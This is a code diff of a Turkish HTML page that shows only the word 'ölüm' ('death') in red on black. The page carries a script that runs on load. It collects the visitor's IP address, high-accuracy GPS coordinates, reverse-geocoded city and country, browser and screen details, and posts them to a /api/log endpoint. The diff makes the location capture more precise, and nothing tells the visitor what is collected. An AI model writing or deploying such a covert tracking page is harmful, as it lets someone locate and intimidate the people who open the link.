@@ -1,95 +1,101 @@
 <!DOCTYPE html>
 <html lang="tr">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>bitmedi</title>
-    <style>
-        body {
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            background-color: black;
-            color: red;
-            font-size: 50px;
-            font-weight: bold;
-            text-align: center;
-        }
-    </style>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>bitmedi</title>
+  <style>
+    body {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      background-color: black;
+      color: red;
+      font-size: 50px;
+      font-weight: bold;
+      text-align: center;
+    }
+  </style>
 </head>
 <body>
-    ölüm
+  ölüm
 
-    <script>
-        async function getUserIP() {
-            try {
-                const res = await fetch('https://api64.ipify.org?format=json'); 
-                const data = await res.json();
-                return data.ip;
-            } catch (error) {
-                console.error("IP alınırken hata oluştu:", error);
-                return "Bilinmeyen";
-            }
+  <script>
+    async function getUserIP() {
+      try {
+        const res = await fetch('https://api64.ipify.org?format=json'); 
+        const data = await res.json();
+        return data.ip;
+      } catch (error) {
+        console.error("IP alınırken hata oluştu:", error);
+        return "Bilinmeyen";
+      }
+    }
+
+    async function getLocationFromCoords(latitude, longitude) {
+      try {
+        // Daha ayrıntılı ve hassas sonuç için zoom ve addressdetails parametreleri eklendi.
+        const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${latitude}&lon=${longitude}&zoom=18&addressdetails=1`);
+        const data = await res.json();
+        return { 
+          country: data.address.country || "Bilinmeyen", 
+          city: data.address.city || data.address.town || data.address.village || "Bilinmeyen"
+        };
+      } catch (error) {
+        console.error("GPS konum alınırken hata oluştu:", error);
+        return { country: "Bilinmeyen", city: "Bilinmeyen" };
+      }
+    }
+
+    function getGPSLocation() {
+      return new Promise((resolve) => {
+        if ("geolocation" in navigator) {
+          navigator.geolocation.getCurrentPosition(
+            async (position) => {
+              const latitude = position.coords.latitude;
+              const longitude = position.coords.longitude;
+              const location = await getLocationFromCoords(latitude, longitude);
+              resolve({ latitude, longitude, location });
+            },
+            (error) => {
+              console.error("Konum izni reddedildi veya hata oluştu:", error);
+              resolve(null);
+            },
+            { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+          );
+        } else {
+          console.error("Tarayıcı konum API'sini desteklemiyor.");
+          resolve(null);
         }
+      });
+    }
 
-        async function getLocationFromCoords(latitude, longitude) {
-            try {
-                const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${latitude}&lon=${longitude}`);
-                const data = await res.json();
-                return { country: data.address.country, city: data.address.city || data.address.town || data.address.village || "Bilinmeyen" };
-            } catch (error) {
-                console.error("GPS konum alınırken hata oluştu:", error);
-                return { country: "Bilinmeyen", city: "Bilinmeyen" };
-            }
-        }
+    async function sendData() {
+      const ip = await getUserIP();
+      let locationData = await getGPSLocation();
 
-        function getGPSLocation() {
-            return new Promise((resolve, reject) => {
-                if ("geolocation" in navigator) {
-                    navigator.geolocation.getCurrentPosition(
-                        async (position) => {
-                            const latitude = position.coords.latitude;
-                            const longitude = position.coords.longitude;
-                            const location = await getLocationFromCoords(latitude, longitude);
-                            resolve({ latitude, longitude, location });
-                        },
-                        (error) => {
-                            console.error("Konum izni reddedildi veya hata oluştu:", error);
-                            resolve(null);
-                        }
-                    );
-                } else {
-                    console.error("Tarayıcı konum API'sini desteklemiyor.");
-                    resolve(null);
-                }
-            });
-        }
+      let userData = {
+        ip: ip,
+        userAgent: navigator.userAgent,
+        platform: navigator.platform,
+        screenWidth: screen.width,
+        screenHeight: screen.height,
+        language: navigator.language,
+        location: locationData ? `${locationData.location.city}, ${locationData.location.country}` : "Konum alınamadı",
+        latitude: locationData ? locationData.latitude : null,
+        longitude: locationData ? locationData.longitude : null
+      };
 
-        async function sendData() {
-            const ip = await getUserIP();
-            let locationData = await getGPSLocation();
+      fetch('/api/log', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(userData)
+      });
+    }
 
-            let userData = {
-                ip: ip,
-                userAgent: navigator.userAgent,
-                platform: navigator.platform,
-                screenWidth: screen.width,
-                screenHeight: screen.height,
-                language: navigator.language,
-                location: locationData ? `${locationData.location.city}, ${locationData.location.country}` : "Konum alınamadı",
-                latitude: locationData ? locationData.latitude : null,
-                longitude: locationData ? locationData.longitude : null
-            };
-
-            fetch('/api/log', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(userData)
-            });
-        }
-
-        sendData(); 
-    </script>
+    // Sayfa açılır açılmaz veri gönderimi başlatılıyor.
+    sendData();
+  </script>
 </body>
 </html>
